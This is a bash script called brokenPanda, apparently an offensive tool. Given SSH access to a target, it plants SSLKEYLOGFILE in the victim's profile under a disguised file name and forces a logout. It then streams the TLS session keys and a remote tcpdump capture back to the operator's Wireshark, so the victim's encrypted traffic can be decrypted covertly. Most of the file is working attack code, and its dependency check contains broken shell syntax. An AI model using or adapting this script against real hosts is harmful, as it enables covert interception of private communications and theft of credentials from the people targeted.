#!/bin/bash
#
# bP - brokenPanda
# Version 0.5
# Author: bmshema
#
#
###################
### TEXT COLORS ###
###################
# Reset
uncolor='\033[0m'         # Text Reset
# Regular Colors
red='\033[0;31m'          # Red
green='\033[0;32m'        # Green
yellow='\033[0;33m'       # Yellow
blue='\033[0;34m'         # Blue
purple='\033[0;35m'       # Purple
cyan='\033[0;36m'         # Cyan
white='\033[0;37m'        # White
# Bold
bred='\033[1;31m'         # Red
byellow='\033[1;33m'      # Yellow
bgreen='\033[1;32m'       # Green
bblue='\033[1;34m'         # Blue

###################
#### FUNCTIONS ####
###################

check_dependencies() {
    if ! which wireshark > /dev/null; then
        echo -e "${bred}Wireshark is not installed!${uncolor}"
        echo -e -n "Do you want to install it now? [y/n]: " 
        read wschoice
        if wschoice ! "y" or "Y"; then
            echo "Exiting..."
            exit 1
        else
            apt install wireshark -y    
        fi
    fi
   
    if ! which sshpass > /dev/null; then
        echo -e "${bred}sshpass is not installed!${uncolor}"
        echo -e -n "${red}Do you want to install it now? [y/n]: " 
        read spchoice
        if spchoice ! "y" or "Y"; then
            echo "${red}Exiting...${uncolor}"
            exit 1
        else
            apt install sshpass -y
        fi
    fi
}

start_wireshark() {
    wireshark -k -i /tmp/loot
}

remote_host_pw() {
    sshpass -p "${PASS}" ssh -o StrictHostKeyChecking=no ${TARGET} 'touch /tmp/.update.log ; echo "export SSLKEYLOGFILE=/tmp/.update.log" >> ~/.profile ; source ~/.profile' &
    sleep 5
    sshpass -p "${PASS}" ssh -o StrictHostKeyChecking=no ${TARGET} 'gnome-session-quit --no-prompt' &
    sshpass -p "${PASS}" ssh -o StrictHostKeyChecking=no ${TARGET} 'tail -f /tmp/.update.log' >> /tmp/pandaloot/keyloot.log &
    sshpass -p "${PASS}" ssh -o StrictHostKeyChecking=no ${TARGET} "echo ${PASS} | sudo -S tcpdump -s0 -U -n -w -" > /tmp/loot & 
    echo -e "\n${bred}Add the local copy of keyloot.log to wireshark located in /tmp/pandaloot/keyloot.log${uncolor}"
    echo -e "${blue}In Wireshark: Edit > Preferences > Protocols > TLS > Pre-Master Secret log filename\n"
    echo -e "Everything should be running. Press Ctrl + C to stop everything.${uncolor}"
}

remote_host_rsa() {
    ssh -i ${KEYFILE} ${TARGET} 'touch /tmp/.update.log ; echo "export SSLKEYLOGFILE=/tmp/.update.log" >> ~/.profile ; source ~/.profile' &
    sleep 5
    ssh -i ${KEYFILE} ${TARGET} 'gnome-session-quit --no-prompt'
    ssh -i ${KEYFILE} ${TARGET} 'tail -f /tmp/.update.log' >> /tmp/pandaloot/keyloot.log &
    ssh -i ${KEYFILE} ${TARGET} 'sudo tcpdump -s0 -U -n -w -' > /tmp/loot &
    echo -e "\n${bred}Add the local copy of keyloot.log to wireshark located in /tmp/pandaloot/keyloot.log${uncolor}"
    echo -e "${blue}In Wireshark: Edit > Preferences > Protocols > TLS > Pre-Master Secret log filename${uncolor}\n"
    echo -e "${yellow}Everything should be running. Press Ctrl + C to stop everything.${uncolor}"
}

###################
##### STARTUP #####
###################

echo -e "${bred}
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣦⣄⡀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣟⠻⣿⡽⢹⣷⠆⣸⣿⣿⣿⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣿⣿⣿⣿⠟⠙⣿⡇⠀⠈⣿⡋⢾⣟⠐⢻⡃⠸⢻⣿⣿⣿⡿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⢿⣿⣷⣶⣿⣷⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠋⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠟⠛⠋⠉⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠳⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⠀⠀⠀⠀⢀⣀⣠⣶⣿⠷⣶⣤⣄⣀⣤⣶⣶⣦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⣿⣷⡶⠚⠋⠉⠉⠁⠀⠀⠀⠀⠈⠉⠛⠿⣿⣿⣿⣷⡀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⣿⣿⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⠇⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣧⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⡇⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⣴⣶⣿⣷⣦⡀⢀⣀⣾⠃⠀⠀⠀⠀⠀⣀⣠⣤⣤⣄⣀⠀⠀⠀⠀⠀⠀⠀⢠⣶⣾⣿⣾⣿⡀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢸⣿⣿⣿⣿⠿⠛⠋⢹⡏⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣷⡄⠀⠀⠀⠀⠠⣿⣿⣿⣿⣿⣿⣷⡀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠘⢿⣿⠟⠁⠀⠀⠀⣼⡇⠀⠀⠀⠀⣿⣿⣿⣿⣿⣛⣿⣿⣿⡇⠀⠀⠀⠀⠀⠹⣿⣿⣭⣽⣿⣿⣷⡄⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣼⠃⠀⠀⠀⠀⠀⢻⡇⠀⠀⠀⠀⢻⣿⣿⣿⣿⣿⣿⣿⠟⠀⠀⠀⣠⣤⣤⡄⠉⠻⠿⠿⠿⠛⠈⣷⠀⠀⠀⠀
⠀⠀⠀⠀⢰⡏⠀⠀⠀⠀⠀⠀⠸⣧⠀⠀⠀⠀⠀⠙⠻⠿⠿⠟⠛⠁⠀⠀⠀⠀⠈⠙⠋⠀⠀⠀⠀⠀⠀⠀⢠⡟⠀⠀⠀⠀
⠀⣠⣤⣤⣸⡇⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣶⣦⣄⣀⣀⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⠁⠀⠀⠀⠀
⢸⣿⣿⣿⣿⣷⡀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡄⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣴⣾⣿⣿⣿⡆⠀⠀⠀
⠘⢿⣿⣿⣿⣿⣷⣤⣤⣤⣤⣤⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣁⣀⣀⣤⣤⣤⣶⣾⣿⣿⣿⣿⣿⣿⣿⠿⠁⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
--------------------------------------------------------------------------------
___.                 __                __________                    .___       
\_ |_________  ____ |  | __ ____   ____\______   \_____    ____    __| _/____   
 | __ \_  __ \/  _ \|  |/ // __ \ /    \|     ___/\__  \  /    \  / __ |\__  \  
 | \_\ \  | \(  <_> )    <\  ___/|   |  \    |     / __ \|   |  \/ /_/ | / __ \_
 |___  /__|   \____/|__|_ \\___  >___|  /____|    (____  /___|  /\____ |(____  /
     \/                  \/    \/     \/               \/     \/      \/     \/ 
--------------------------------------------------------------------------------
${uncolor}"


###################
### DEP CHECKS ####
###################

echo -e "${bblue}Checking some things....\n"
echo -ne "${green}########################                                                   (25%)\r${uncolor}"
sleep 1
echo -ne "${green}########################################                                   (50%)\r${uncolor}"
sleep 1
echo -ne "${green}##########################################################                 (75%)\r${uncolor}"
sleep 1           
echo -ne "${green}##########################################################################(100%)\r${uncolor}\n"
echo -ne '\n'

if (( $EUID != 0)); then
    echo -e "${bred}You must run with sudo!${uncolor}"
    echo -e "\n${bred}<<< Quitting >>>${uncolor}"
    exit
fi

check_dependencies 

echo -e "${bblue}Dependency checks good!${uncolor}\n"
echo -e "${green}--------------------------------------------------------------------------------\n"
echo -e "${bgreen}USAGE:\n"
echo -e "${green}1.> Answer target credential prompts"
echo -e "2.> Add TLS keylog file to Wireshark"
echo -e "3.> Chill..."
echo -e "\n[*] (Keylog is located in /tmp/pandaloot/keyloot.log)"
echo -e "[*] Add to Wireshark:"
echo -e "    Edit > Preferences > Protocols > TLS > Pre-Master Secret log filename\n"
echo -e "${yellow}--------------------------------------------------------------------------------\n"
sleep 1
echo -e "${byellow}TARGET AND CREDENTIAL PROMPTS:"
echo -ne '\n'

# Making keylog loot files and named pipe
if [ ! -e /tmp/loot ]; then
    mkfifo /tmp/loot
fi

mkdir -p /tmp/pandaloot

if [ ! -f /tmp/pandaloot/keyloot.log ]; then
    touch /tmp/pandaloot/keyloot.log
fi

echo -e "${yellow}Is your SSH access to the target via password or RSA key?"
read -rep "[Enter 'p' if password OR 'k' if key]: " PORK
echo -ne '\n'
 
if [ $PORK = "p" ] || [ $PORK = "P" ]; then
    read -p "Enter 'username@ip_address' for the target: " TARGET
    read -p "Enter the user password for the target: " PASS
    echo -e "--------------------------------------------------------------------------------"
    sleep 1
    start_wireshark &
    gnome-terminal -- tail -f /tmp/pandaloot/keyloot.log
    sleep 3
    remote_host_pw &
    wait
    exit 1

elif [ $PORK = "k" ] || [ $PORK = "K" ]; then
    read -p "Enter 'username@ip_address' for the target: " TARGET
    read -p "Enter the full path to your private key file: " KEYFILE
    echo -e "--------------------------------------------------------------------------------"
    sleep 1
    start_wireshark &
    gnome-terminal -- tail -f /tmp/pandaloot/keyloot.log
    sleep 3
    remote_host_rsa &
    wait
    exit 1
    
else
    echo -e "${bred}Invalid Option. Byeee! "
    exit 1

fi
exit